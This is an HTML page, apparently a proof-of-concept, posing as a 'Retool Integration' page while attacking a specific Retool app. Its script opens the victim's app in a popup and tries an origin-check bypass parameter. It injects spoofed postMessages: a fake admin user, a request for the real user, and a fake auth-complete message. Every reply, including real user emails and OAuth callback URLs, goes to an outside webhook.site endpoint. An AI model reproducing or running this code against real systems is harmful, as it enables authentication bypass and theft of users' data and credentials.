<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 520px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
  #log { margin-top: 16px; font-size: 11px; color: #94a3b8; max-height: 150px; overflow-y: auto; text-align: left; font-family: monospace; background: #f8fafc; border-radius: 4px; padding: 8px; }
  .log-line { padding: 2px 0; border-bottom: 1px solid #f1f5f9; word-break: break-all; }
  .good { color: #16a34a; font-weight: bold; }
  .warn { color: #d97706; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Ready</h2>
  <p id="sub">Click to attack</p>
  <div id="log"></div>
</div>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/40e12f3f-6c20-4215-b822-92194f6cc88a';
  var ATK = location.origin;
  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
  var HOST = 'https://jonjos11.retool.com';

  // Two URLs to test:
  // 1. Without retool-parent-origin (normal mode)
  // 2. With retool-parent-origin (IFRAME_HOSTED mode bypass)
  var APP_URL_NO_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage';
  var APP_URL_BYPASS = HOST + '/apps/' + APP_ID + '/asa/defaultPage?retool-parent-origin=' + encodeURIComponent(ATK);
  var EDITOR_URL_BYPASS = HOST + '/apps/' + APP_ID + '/editor?retool-parent-origin=' + encodeURIComponent(ATK);

  var popupRef = null;
  var msgCount = 0;

  function X(payload) {
    var j = JSON.stringify(payload);
    // sendBeacon (text/plain = no CORS preflight)
    if (navigator.sendBeacon) {
      navigator.sendBeacon(WH, new Blob([j], { type: 'text/plain' }));
    }
    // Image beacon (no CORS needed)
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0, 1400));
  }

  function addLog(msg, cls) {
    console.log('[PoC]', msg);
    var el = document.getElementById('log');
    var line = document.createElement('div');
    line.className = 'log-line' + (cls ? ' ' + cls : '');
    line.textContent = msg;
    el.appendChild(line);
    el.scrollTop = el.scrollHeight;
  }

  // ================================================================
  // ATTACK: Open retool app in popup
  // We try DIFFERENT URL variants to find what works
  // ================================================================
  function launchAttack(url, label) {
    addLog('Opening: ' + label);

    popupRef = window.open(url, 'retoolWin', 'width=1200,height=800,left='+((screen.width-1200)/2)+',top='+((screen.height-800)/2));

    if (!popupRef) {
      addLog('Popup blocked!', 'warn');
      return false;
    }

    X({ event: 'popup_opened', label: label, url: url, time: new Date().toISOString() });

    // Inject postMessages at intervals
    setTimeout(function() { sendProbes(); }, 5000);
    setTimeout(function() { sendProbes(); }, 10000);
    setTimeout(function() { sendProbes(); }, 15000);
    setTimeout(function() { sendProbes(); }, 20000);

    // Monitor popup
    var monitor = setInterval(function() {
      if (!popupRef || popupRef.closed) {
        clearInterval(monitor);
        addLog('Popup closed after ' + label, 'warn');
        X({ event: 'popup_closed', label: label, msgCount: msgCount, time: new Date().toISOString() });
      }
    }, 1000);

    return true;
  }

  function sendProbes() {
    if (!popupRef || popupRef.closed) return;

    // RETOOL_CURRENT_USER - inject a test user with beacon
    try {
      popupRef.postMessage({
        type: 'RETOOL_CURRENT_USER',
        data: {
          id: 1,
          email: 'probe@attacker.com',
          firstName: 'Probe',
          lastName: 'User',
          fullName: 'Probe User',
          profilePhotoUrl: WH + '?beacon=photo&ts=' + Date.now(),
          groups: [{ id: 1, name: 'admin' }],
          metadata: { _beacon: true, _ts: Date.now() },
          sid: 'inj-' + Date.now(),
          externalIdentifier: null,
          locale: 'en'
        }
      }, '*');
    } catch(e) {}

    // RETOOL_CURRENT_USER_REQUEST - ask for real user
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      try {
        popupRef.postMessage({ type: 'RETOOL_CURRENT_USER_REQUEST' }, '*');
      } catch(e) {}
    }, 500);

    // RETOOL_AUTH_COMPLETE - bypass auth
    setTimeout(function() {
      if (!popupRef || popupRef.closed) return;
      try {
        popupRef.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
      } catch(e) {}
    }, 1000);
  }

  // ================================================================
  // INTERCEPT ALL postMessages
  // ================================================================
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    msgCount++;

    var fromPopup = false;
    try {
      fromPopup = popupRef && (e.source === popupRef);
    } catch(ex) {}

    var dir = fromPopup ? 'RECV' : 'SENT';
    addLog(dir + ' ' + d.type + (fromPopup ? ' ← FROM APP' : ''), fromPopup ? 'good' : '');

    X({
      event: 'pm',
      dir: dir,
      type: d.type,
      data: d,
      origin: e.origin,
      time: new Date().toISOString()
    });

    // Check for real user data (not our probes)
    if (fromPopup && d.type === 'RETOOL_CURRENT_USER' && d.data) {
      var email = d.data.email || '';
      if (email && email !== 'probe@attacker.com' && email.indexOf('xss') === -1) {
        addLog('REAL USER DATA: ' + email, 'good');
        document.getElementById('msg').textContent = 'REAL DATA!';
        document.getElementById('sub').textContent = email;
        X({ event: 'REAL_USER', data: d.data, time: new Date().toISOString() });
      }
    }

    if (fromPopup && d.type === 'RR_OAUTH_RESOURCE') {
      addLog('OAUTH RESOURCE: ' + (d.resourceName || '?'), 'good');
    }

    if (d.type === 'source' && d.url) {
      addLog('OAuth callback URL: ' + d.url, 'good');
    }
  });

  // ================================================================
  // START
  // ================================================================
  document.getElementById('msg').textContent = 'Ready';
  document.getElementById('sub').textContent = 'Click to attack';
  document.getElementById('spin').style.display = 'none';
  addLog('Test 1: popup WITHOUT retool-parent-origin');
  addLog('Test 2: popup WITH retool-parent-origin');
  addLog('Test 3: editor popup WITH retool-parent-origin');

  var testNum = 0;

  document.body.addEventListener('click', function go() {
    document.body.removeEventListener('click', go);
    document.getElementById('msg').textContent = 'Attacking...';
    document.getElementById('spin').style.display = 'block';

    X({ event: 'start', attacker: ATK, time: new Date().toISOString() });

    testNum++;
    if (testNum === 1) {
      document.getElementById('sub').textContent = 'Test 1: Normal popup';
      launchAttack(APP_URL_NO_BYPASS, 'test1-no-bypass');
    } else if (testNum === 2) {
      document.getElementById('sub').textContent = 'Test 2: With origin bypass';
      launchAttack(APP_URL_BYPASS, 'test2-with-bypass');
    } else {
      document.getElementById('sub').textContent = 'Test 3: Editor bypass';
      launchAttack(EDITOR_URL_BYPASS, 'test3-editor-bypass');
    }
  });

})();
</script>
</body>
</html>
